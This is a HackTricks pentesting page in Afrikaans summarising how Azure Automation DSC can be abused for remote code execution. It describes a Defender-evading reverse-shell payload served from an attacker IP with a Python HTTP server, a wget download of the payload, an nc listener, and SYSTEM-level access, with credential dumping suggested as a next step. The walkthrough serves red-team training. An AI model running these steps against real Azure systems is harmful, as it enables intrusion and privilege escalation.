# Az - State Configuration RCE

{% hint style="success" %}
Leer & oefen AWS Hacking:<img src="../../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Leer & oefen GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** ğŸ’¬ [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacking truuks deur PR's in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

**Kyk na die volledige pos in:** [**https://medium.com/cepheisecurity/abusing-azure-dsc-remote-code-execution-and-privilege-escalation-ab8c35dd04fe**](https://medium.com/cepheisecurity/abusing-azure-dsc-remote-code-execution-and-privilege-escalation-ab8c35dd04fe)

### Samevatting van AfgeleÃ« Bediener (C2) Infrastruktuur Voorbereiding en Stappe

#### Oorsig

Die proses behels die opstelling van 'n afgeleÃ« bediener infrastruktuur om 'n gewysigde Nishang `Invoke-PowerShellTcp.ps1` payload, genaamd `RevPS.ps1`, te huisves, wat ontwerp is om Windows Defender te omseil. Die payload word bedien vanaf 'n Kali Linux masjien met IP `40.84.7.74` met behulp van 'n eenvoudige Python HTTP bediener. Die operasie word deur verskeie stappe uitgevoer:

#### Stap 1 â€” Skep LÃªers

* **Benodigde LÃªers:** Twee PowerShell skripte is nodig:
1. `reverse_shell_config.ps1`: 'n Gewenste Toestand Konfigurasie (DSC) lÃªer wat die payload aflaai en uitvoer. Dit is verkrygbaar van [GitHub](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/reverse\_shell\_config.ps1).
2. `push_reverse_shell_config.ps1`: 'n skrip om die konfigurasie na die VM te publiseer, beskikbaar by [GitHub](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/push\_reverse\_shell\_config.ps1).
* **Aanpassing:** Veranderlikes en parameters in hierdie lÃªers moet aangepas word vir die gebruiker se spesifieke omgewing, insluitend hulpbronname, lÃªerpaaie, en bediener/payload identifiseerders.

#### Stap 2 â€” Zip Konfigurasie LÃªer

* Die `reverse_shell_config.ps1` word gecomprimeer in 'n `.zip` lÃªer, wat dit gereed maak vir oordrag na die Azure Storage Account.
```powershell
Compress-Archive -Path .\reverse_shell_config.ps1 -DestinationPath .\reverse_shell_config.ps1.zip
```
#### Stap 3 â€” Stel Bergingskonteks in & Laai op

* Die gecomprimeerde konfigurasie-lÃªer word na 'n voorafbepaalde Azure Bergingshouer, azure-pentest, opgelaai met behulp van Azure se Set-AzStorageBlobContent cmdlet.
```powershell
Set-AzStorageBlobContent -File "reverse_shell_config.ps1.zip" -Container "azure-pentest" -Blob "reverse_shell_config.ps1.zip" -Context $ctx
```
#### Stap 4 â€” Berei Kali Box Voor

* Die Kali-bediener laai die RevPS.ps1 payload af van 'n GitHub-bewaarplek.
```bash
wget https://raw.githubusercontent.com/nickpupp0/AzureDSCAbuse/master/RevPS.ps1
```
* Die skrif is gewysig om die teiken Windows VM en poort vir die omgekeerde skulp te spesifiseer.

#### Stap 5 â€” Publiseer Konfigurasie LÃªer

* Die konfigurasie lÃªer word uitgevoer, wat lei tot die ontplooiing van die omgekeerde-skulpskrif na die gespesifiseerde ligging op die Windows VM.

#### Stap 6 â€” Gasheer Payload en Stel Luisteraar Op

* 'n Python SimpleHTTPServer word begin om die payload te gasheer, saam met 'n Netcat luisteraar om inkomende verbindings te vang.
```bash
sudo python -m SimpleHTTPServer 80
sudo nc -nlvp 443
```
* Die geskeduleerde taak voer die payload uit, wat SYSTEM-vlak voorregte bereik.

#### Gevolgtrekking

Die suksesvolle uitvoering van hierdie proses open talle moontlikhede vir verdere aksies, soos kredensiaal dumping of die uitbreiding van die aanval na verskeie VM's. Die gids moedig voortgesette leer en kreatiwiteit in die gebied van Azure Automation DSC aan.

{% hint style="success" %}
Leer & oefen AWS Hacking:<img src="../../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Leer & oefen GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** ğŸ’¬ [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacking truuks deur PR's in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
